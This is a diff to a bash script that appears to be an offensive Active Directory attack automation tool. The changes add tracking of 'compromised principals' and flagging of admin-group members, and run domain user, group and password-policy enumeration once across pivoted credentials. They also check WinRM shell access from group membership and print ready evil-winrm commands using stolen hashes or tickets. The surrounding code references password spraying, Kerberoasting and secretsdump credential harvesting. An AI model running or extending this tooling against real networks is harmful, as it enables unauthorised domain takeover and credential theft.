@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.8.0"
+readonly VERSION="1.9.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -158,7 +158,11 @@ declare -A SPRAYED=()             # password→done, so we don't spray twice
 # the same document / roast+crack the same account five times over.
 declare -A CRACKED_DOCS=()        # doc basename → already cracked/attempted
 declare -A TRIED_HASHES=()        # per-account (krb) or per-hash (ntlm) → already cracked-attempted
+declare -A OWNED_GROUPS=()        # compromised user → comma-joined group memberships
+declare -A OWNED_ADMIN=()         # compromised user → 1 if in a privileged/admin group
 KERB_DONE=0                       # Kerberoast request runs once (SPN set is domain-wide)
+# Groups that mean "this account is effectively privileged" → crown it in the summary
+ADMIN_GROUP_RE='Domain Admins|Enterprise Admins|Schema Admins|Administrators|Account Operators|Backup Operators|Server Operators|Print Operators|DnsAdmins|Group Policy Creator Owners|Enterprise Key Admins|Key Admins|Domain Controllers'
 DOMAIN_WL=""                      # path to the generated domain-focused wordlist
 
 # ===========================================================================
@@ -706,59 +710,71 @@ phase_validate_creds() {
 # ===========================================================================
 #  PHASE 5 — AUTHENTICATED ENUMERATION
 # ===========================================================================
+AUTH_ENUM_DONE=0
 phase_auth_enum() {
     [[ "$HAVE_AUTH" != "1" ]] && return
-    section "PHASE 5 · AUTHENTICATED ENUMERATION"
     local args; mapfile -t args < <(nxc_cred_args)
 
-    subsection "Password policy"
-    run "$NXC smb $DCT ${args[*]} --pass-pol"
-    $NXC smb "$DCT" "${args[@]}" --pass-pol 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/pass_policy.txt"
+    # ---- Domain-wide enumeration: users, groups, password policy, descriptions,
+    # MAQ. Any authenticated identity sees the SAME thing here, so running it for
+    # every pivoted credential is just noise — do it ONCE. Per-identity facts
+    # (readable shares, LAPS/gMSA, ACLs, WinRM, …) still re-run in their phases.
+    if [[ "$AUTH_ENUM_DONE" != "1" ]]; then
+        AUTH_ENUM_DONE=1
+        section "PHASE 5 · AUTHENTICATED ENUMERATION (domain-wide — runs once)"
 
-    subsection "Domain users"
-    run "$NXC smb $DCT ${args[*]} --users"
-    $NXC smb "$DCT" "${args[@]}" --users 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/domain_users.txt"
-    # Extract clean usernames (rows whose date column is a date or <never>) and
-    # merge into the master list so the summary + any user-driven logic see them.
-    awk '$6 ~ /^[0-9]{4}-[0-9]{2}-[0-9]{2}$/ || $6=="<never>" {print $5}' "$OUTDIR/domain_users.txt" 2>/dev/null \
-        | grep -vE '^$' | sort -u >"$OUTDIR/users_enum.txt"
-    if [[ -s "$OUTDIR/users_enum.txt" ]]; then
-        cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
-        loot "$(wc -l <"$OUTDIR/users_enum.txt") domain users enumerated → users_all.txt"
-    fi
+        subsection "Password policy"
+        run "$NXC smb $DCT ${args[*]} --pass-pol"
+        $NXC smb "$DCT" "${args[@]}" --pass-pol 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/pass_policy.txt"
 
-    subsection "Domain groups"
-    run "$NXC smb $DCT ${args[*]} --groups"
-    $NXC smb "$DCT" "${args[@]}" --groups 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/domain_groups.txt"
+        subsection "Domain users"
+        run "$NXC smb $DCT ${args[*]} --users"
+        $NXC smb "$DCT" "${args[@]}" --users 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/domain_users.txt"
+        # Extract clean usernames (rows whose date column is a date or <never>) and
+        # merge into the master list so the summary + any user-driven logic see them.
+        awk '$6 ~ /^[0-9]{4}-[0-9]{2}-[0-9]{2}$/ || $6=="<never>" {print $5}' "$OUTDIR/domain_users.txt" 2>/dev/null \
+            | grep -vE '^$' | sort -u >"$OUTDIR/users_enum.txt"
+        if [[ -s "$OUTDIR/users_enum.txt" ]]; then
+            cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
+            loot "$(wc -l <"$OUTDIR/users_enum.txt") domain users enumerated → users_all.txt"
+        fi
 
-    if [[ "$CAP_LDAP" == "1" ]]; then
-        subsection "User descriptions (often leak passwords)"
-        run "$NXC ldap $DCT ${args[*]} -M get-desc-users"
-        $NXC ldap "$DCT" "${args[@]}" -M get-desc-users 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/user_descriptions.txt"
-        grep -iE 'pass|pwd|cred' "$OUTDIR/user_descriptions.txt" 2>/dev/null \
-            && loot "Possible passwords in descriptions! review user_descriptions.txt"
+        subsection "Domain groups"
+        run "$NXC smb $DCT ${args[*]} --groups"
+        $NXC smb "$DCT" "${args[@]}" --groups 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/domain_groups.txt"
 
-        subsection "Quick privilege-escalation indicators (LDAP modules)"
-        for mod in maq adcs; do
-            run "$NXC ldap $DCT ${args[*]} -M $mod"
-            $NXC ldap "$DCT" "${args[@]}" -M "$mod" 2>&1 | tee -a "$LOGFILE"
-        done
-        info "MachineAccountQuota > 0 → potential escalation via machine accounts (RBCD)"
-    else
-        subsection "LDAP not exposed → secondary enumeration via rpcclient"
-        if [[ "$CAP_RPC" == "1" || "$CAP_SMB" == "1" ]]; then
-            local pw="${PASS:-}"; [[ -n "$HASH" ]] && pw="$HASH"
-            run "rpcclient -U '$DOMAIN/$USER%***' $DC_IP -c 'enumdomusers;querydispinfo'"
-            rpcclient -U "${DOMAIN}/${USER}%${pw}" "$DC_IP" -c 'enumdomusers;querydispinfo' 2>&1 \
-                | tee -a "$LOGFILE" | tee "$OUTDIR/rpc_users_auth.txt"
+        if [[ "$CAP_LDAP" == "1" ]]; then
+            subsection "User descriptions (often leak passwords)"
+            run "$NXC ldap $DCT ${args[*]} -M get-desc-users"
+            $NXC ldap "$DCT" "${args[@]}" -M get-desc-users 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/user_descriptions.txt"
+            grep -iE 'pass|pwd|cred' "$OUTDIR/user_descriptions.txt" 2>/dev/null \
+                && loot "Possible passwords in descriptions! review user_descriptions.txt"
+
+            subsection "Quick privilege-escalation indicators (LDAP modules)"
+            for mod in maq adcs; do
+                run "$NXC ldap $DCT ${args[*]} -M $mod"
+                $NXC ldap "$DCT" "${args[@]}" -M "$mod" 2>&1 | tee -a "$LOGFILE"
+            done
+            info "MachineAccountQuota > 0 → potential escalation via machine accounts (RBCD)"
         else
-            warn "No LDAP/RPC/SMB for secondary enum — limited visibility"
+            subsection "LDAP not exposed → secondary enumeration via rpcclient"
+            if [[ "$CAP_RPC" == "1" || "$CAP_SMB" == "1" ]]; then
+                local pw="${PASS:-}"; [[ -n "$HASH" ]] && pw="$HASH"
+                run "rpcclient -U '$DOMAIN/$USER%***' $DC_IP -c 'enumdomusers;querydispinfo'"
+                rpcclient -U "${DOMAIN}/${USER}%${pw}" "$DC_IP" -c 'enumdomusers;querydispinfo' 2>&1 \
+                    | tee -a "$LOGFILE" | tee "$OUTDIR/rpc_users_auth.txt"
+            else
+                warn "No LDAP/RPC/SMB for secondary enum — limited visibility"
+            fi
         fi
     fi
 
-    subsection "Readable shares (authenticated)"
+    # ---- Per-identity: which shares THIS credential can actually read varies by
+    # user, so this part runs every pivot. Saved per-user to keep each view.
+    local uf; uf="$(_safe_name "$USER")"
+    subsection "Readable shares as ${USER}"
     run "$NXC smb $DCT ${args[*]} --shares"
-    $NXC smb "$DCT" "${args[@]}" --shares 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/shares_auth.txt"
+    $NXC smb "$DCT" "${args[@]}" --shares 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/shares_auth_${uf}.txt" "$OUTDIR/shares_auth.txt"
 }
 
 # ===========================================================================
@@ -1103,21 +1119,49 @@ phase_winrm_dpapi() {
     if [[ "$CAP_WINRM" == "1" ]]; then
         subsection "WinRM: can this account get a remote shell?"
         run "$NXC winrm $DCT ${args[*]}"
-        local w; w=$($NXC winrm "$DCT" "${args[@]}" 2>&1); echo "$w" | tee -a "$LOGFILE"
-        if echo "$w" | grep -qi 'Pwn3d'; then
+        local w; w=$($NXC winrm "$DCT" "${args[@]}" 2>&1)
+        # nxc's winrm check frequently blows up under Kerberos while parsing the
+        # negotiate challenge ("Unpacked data doesn't match … NTLMSSP", a Traceback
+        # in enum_host_info). That's an nxc bug, NOT a lack of access — so don't
+        # spew the traceback to the operator; keep it in the log and decide WinRM
+        # eligibility from group membership, which is authoritative.
+        local winrm_err=0
+        if grep -qiE 'NTLMSSP|Traceback|proto_flow|Unpacked data|object has no attribute' <<<"$w"; then
+            winrm_err=1; printf '%s\n' "$w" >>"$LOGFILE"
+        else
+            echo "$w" | tee -a "$LOGFILE"
+        fi
+
+        # Who is in 'Remote Management Users' (Administrators can WinRM too). Read
+        # once via LDAP and reused both to decide access and to show the list.
+        local rmu="" can_winrm=0
+        grep -qi 'Pwn3d' <<<"$w" && can_winrm=1
+        if [[ "$CAP_LDAP" == "1" ]]; then
+            rmu=$($NXC ldap "$DCT" "${args[@]}" -M group-mem -o GROUP="Remote Management Users" 2>/dev/null)
+            printf '%s\n' "$rmu" >>"$LOGFILE"; printf '%s\n' "$rmu" >"$OUTDIR/winrm_users.txt"
+            local u_re; u_re=$(printf '%s' "$USER" | sed 's/[][\.^$*+?(){}|]/\\&/g')
+            grep -qiE "(\\\\|[[:space:]])${u_re}([[:space:]]|\$)" <<<"$rmu" && can_winrm=1
+        fi
+        [[ -n "${OWNED_ADMIN[$USER]:-}" ]] && can_winrm=1   # admins can always WinRM
+
+        if [[ "$can_winrm" == "1" ]]; then
             loot "★ ${USER} has WinRM shell access!"
             if [[ -n "$KERB_TICKET" ]]; then
                 ok "Shell:  KRB5CCNAME=$KERB_TICKET evil-winrm -i $DC_FQDN -r $DOMAIN"
             else
                 ok "Shell:  evil-winrm -i $DC_FQDN -u $USER $( [[ -n "$HASH" ]] && echo "-H $HASH" || echo "-p '<pass>'" )"
             fi
-            analyze_privileges
+            [[ "$winrm_err" == "1" ]] && info "(nxc's WinRM probe errored under Kerberos — access confirmed via group membership; use the evil-winrm line above)"
+            [[ "$winrm_err" == "0" ]] && analyze_privileges   # whoami /priv only works if nxc's winrm didn't choke
+        elif [[ "$winrm_err" == "1" ]]; then
+            warn "WinRM probe errored (known nxc Kerberos bug) and ${USER} isn't in Remote Management Users → assume no WinRM"
+        else
+            info "${USER} cannot WinRM (not Pwn3d, not in Remote Management Users)"
         fi
+
         if [[ "$CAP_LDAP" == "1" ]]; then
             subsection "Members of 'Remote Management Users' (who can WinRM)"
-            run "$NXC ldap $DCT ${args[*]} -M group-mem -o GROUP='Remote Management Users'"
-            $NXC ldap "$DCT" "${args[@]}" -M group-mem -o GROUP="Remote Management Users" 2>&1 \
-                | tee -a "$LOGFILE" | tee "$OUTDIR/winrm_users.txt"
+            if [[ -n "$rmu" ]]; then echo "$rmu"; else info "none / not readable"; fi
         fi
     else
         info "WinRM (5985) not exposed on this host"
@@ -1156,6 +1200,28 @@ bloody_args() {
     elif [[ -n "$HASH" ]]; then a+=(-p ":$HASH")
     else a+=(-p "$PASS"); fi
     printf '%s\n' "${a[@]}"
+}
+
+# Record the current (authenticated) identity as compromised, with the groups it
+# belongs to, so the final summary can list "who we own" and crown the admins.
+# Group membership is read via LDAP memberOf (bloodyAD) — any authenticated user
+# can read it, so it works for every owned account, not just WinRM-capable ones.
+record_owned_identity() {
+    [[ "$HAVE_AUTH" != "1" || -z "$USER" ]] && return
+    [[ -n "${OWNED_GROUPS[$USER]:-}" ]] && return         # already recorded this pass
+    local groups="" ba
+    if have bloodyAD && [[ "$CAP_LDAP" == "1" ]]; then
+        mapfile -t ba < <(bloody_args)
+        groups=$(bloodyAD "${ba[@]}" get object "$USER" --attr memberOf 2>/dev/null \
+                 | grep -oiP 'CN=\K[^,]+' | paste -sd', ' -)
+    fi
+    OWNED_GROUPS["$USER"]="${groups:-—}"
+    local admin=0
+    grep -qiE "$ADMIN_GROUP_RE" <<<"$groups" && admin=1
+    [[ "${USER,,}" == "administrator" ]] && admin=1
+    [[ "$admin" == "1" ]] && OWNED_ADMIN["$USER"]=1
+    printf '%s\t%s\t%s\n' "$USER" "$([[ $admin == 1 ]] && echo ADMIN || echo user)" "${groups:-—}" \
+        >>"$OUTDIR/owned_principals.txt"
 }
 
 phase_acl() {
@@ -3066,6 +3132,21 @@ final_summary() {
         ok "Full map saved → credential_map.txt / valid_creds_map.txt"
     fi
 
+    # Compromised principals — every identity we took control of, with the groups
+    # it belongs to. Admins are crowned and shown bright; everyone else is plain.
+    if [[ ${#OWNED_GROUPS[@]} -gt 0 ]]; then
+        section "COMPROMISED PRINCIPALS · accounts under our control"
+        local _u
+        # admins first (bright gold + 👑), then everyone else (plain green), sorted
+        while IFS= read -r _u; do [[ -z "$_u" ]] && continue
+            detail "      ${C_YELLOW}${C_BOLD}👑 ${_u}${C_RESET}  ${C_RED}${C_BOLD}[ADMIN]${C_RESET}  ${C_DIM}${OWNED_GROUPS[$_u]}${C_RESET}"
+        done < <(for k in "${!OWNED_ADMIN[@]}"; do printf '%s\n' "$k"; done | sort)
+        while IFS= read -r _u; do [[ -z "$_u" ]] && continue
+            detail "      ${C_GREEN}${_u}${C_RESET}  ${C_DIM}${OWNED_GROUPS[$_u]}${C_RESET}"
+        done < <(for k in "${!OWNED_GROUPS[@]}"; do [[ -z "${OWNED_ADMIN[$k]:-}" ]] && printf '%s\n' "$k"; done | sort)
+        ok "${#OWNED_GROUPS[@]} compromised (${#OWNED_ADMIN[@]} admin) → owned_principals.txt"
+    fi
+
     # ----- FULL HARVEST: everything recovered, in detail + colour -----------
     local dd=""
     [[ -s "$OUTDIR/secretsdump.txt" ]] && grep -qE ':::' "$OUTDIR/secretsdump.txt" 2>/dev/null && dd="$OUTDIR/secretsdump.txt"
@@ -3144,6 +3225,7 @@ assess_current_credential() {
     phase_validate_creds
     [[ "$HAVE_AUTH" != "1" ]] && { warn "Skipping further phases for $USER (no valid auth)"; return; }
 
+    record_owned_identity        # log this compromised identity + its groups (for the summary)
     phase_auth_enum;    jitter
     phase_user_variants; jitter
     phase_share_loot;   jitter
